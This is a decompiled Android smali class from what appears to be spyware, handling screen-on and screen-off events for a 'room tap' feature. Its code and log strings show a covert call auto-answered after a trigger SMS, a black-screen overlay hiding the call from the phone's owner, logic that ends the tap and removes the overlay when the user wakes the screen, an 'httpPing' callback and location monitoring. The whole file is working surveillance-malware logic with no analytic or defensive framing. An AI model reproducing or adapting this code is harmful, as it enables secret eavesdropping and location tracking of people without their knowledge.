.class final Lcom/network/android/roomTap/m;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Landroid/content/Intent;

.field final synthetic b:Landroid/content/Context;

.field final synthetic c:Lcom/network/android/roomTap/l;


# direct methods
.method constructor <init>(Lcom/network/android/roomTap/l;Landroid/content/Intent;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/network/android/roomTap/m;->c:Lcom/network/android/roomTap/l;

    iput-object p2, p0, Lcom/network/android/roomTap/m;->a:Landroid/content/Intent;

    iput-object p3, p0, Lcom/network/android/roomTap/m;->b:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 6

    const/4 v0, 0x1

    const/4 v1, 0x0

    :try_start_0
    iget-object v2, p0, Lcom/network/android/roomTap/m;->a:Landroid/content/Intent;

    invoke-virtual {v2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v2

    const-string v3, "android.intent.action.SCREEN_ON"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_6

    const/4 v2, 0x1

    sput-boolean v2, Lcom/network/android/roomTap/k;->d:Z

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "ScreenActivityMonitor isRoomTap: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a()Z

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "  isBlackScreenViewWasSet: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-boolean v3, Lcom/network/android/roomTap/BlackScreen;->a:Z

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " shouldTurnScreenOnNextTimeItIsTurnedOnByUser: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-boolean v3, Lcom/network/android/roomTap/k;->c:Z

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " isLocationMonitorActive: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-static {}, Lcom/network/location/a;->a()Z

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "ACTION_SCREEN_ON (new thread) isRoomTap: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a()Z

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-boolean v2, Lcom/network/android/roomTap/k;->c:Z

    if-eqz v2, :cond_0

    sget-boolean v2, Lcom/network/android/roomTap/BlackScreen;->a:Z

    if-eqz v2, :cond_0

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a()Z

    move-result v2

    if-nez v2, :cond_0

    const-string v2, "ScreenActivityMonitor onReceive shouldTurnScreenOnNextTimeItIsTurnedOnByUser is true. removing BlackScreen"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/roomTap/k;->b()V

    :cond_0
    iget-object v2, p0, Lcom/network/android/roomTap/m;->b:Landroid/content/Context;

    invoke-static {v2}, Lcom/network/location/a;->b(Landroid/content/Context;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/16 v4, 0x3e8

    div-long/2addr v2, v4

    invoke-static {v2, v3}, Lcom/network/android/roomTap/k;->a(J)J

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/16 v4, 0x3e8

    div-long/2addr v2, v4

    sget-wide v4, Lcom/network/android/roomTap/AutoAnswerReceiver;->a:J

    sub-long/2addr v2, v4

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a()Z

    move-result v4

    if-eqz v4, :cond_4

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "BlackScreen coverTime:  "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-wide/16 v4, 0x5

    cmp-long v4, v2, v4

    if-gez v4, :cond_2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "BlackScreen coverTime too small in order to stop tap:  "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_1
    :goto_0
    return-void

    :cond_2
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "unlock:  "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v2, 0x1

    const/16 v3, 0x40

    const-string v4, "ROOM_TAP_ENDED_SCREEN_ON"

    invoke-static {v2, v3, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    sget-boolean v2, Lcom/network/android/roomTap/AutoAnswerReceiver;->d:Z

    if-nez v2, :cond_3

    :goto_1
    sput-boolean v0, Lcom/network/android/roomTap/k;->b:Z

    iget-object v0, p0, Lcom/network/android/roomTap/m;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->b(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ScreenActivityMonitor Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0

    :cond_3
    move v0, v1

    goto :goto_1

    :cond_4
    :try_start_1
    sget-boolean v0, Lcom/network/android/a/c;->f:Z

    if-eqz v0, :cond_5

    const-string v0, "BlackScreen got Tap sms, call not yet arrived and user activity was detected"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/roomTap/m;->b:Landroid/content/Context;

    const-string v1, "httpPing"

    invoke-static {v0, v1}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/roomTap/k;->b()V

    iget-object v0, p0, Lcom/network/android/roomTap/m;->b:Landroid/content/Context;

    invoke-static {}, Lcom/network/b/b;->x()J

    move-result-wide v1

    invoke-static {}, Lcom/network/b/b;->a()J

    move-result-wide v3

    sub-long/2addr v1, v3

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a(Landroid/content/Context;Ljava/lang/Long;)V

    const-string v0, "BlackScreen Screen Activitt Monitor setting GOT_TAP_SMS_CALL_NOT_YET_ARRIVED false"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/android/a/c;->f:Z

    goto :goto_0

    :cond_5
    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a()Z

    move-result v0

    if-nez v0, :cond_1

    invoke-static {}, Lcom/network/location/a;->a()Z

    move-result v0

    if-nez v0, :cond_1

    sget-boolean v0, Lcom/network/android/roomTap/BlackScreen;->a:Z

    if-eqz v0, :cond_1

    const-string v0, "BlackSCreen last case was activated"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "screenRemove"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/network/android/roomTap/n;

    invoke-direct {v1, p0}, Lcom/network/android/roomTap/n;-><init>(Lcom/network/android/roomTap/m;)V

    const-wide/16 v2, 0x1f4

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto/16 :goto_0

    :cond_6
    iget-object v0, p0, Lcom/network/android/roomTap/m;->a:Landroid/content/Intent;

    invoke-virtual {v0}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.intent.action.SCREEN_OFF"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "ACTION_SCREEN_OFF  "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/android/roomTap/k;->d:Z

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    invoke-static {v0, v1}, Lcom/network/android/roomTap/k;->a(J)J

    iget-object v0, p0, Lcom/network/android/roomTap/m;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/location/a;->d(Landroid/content/Context;)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0
.end method
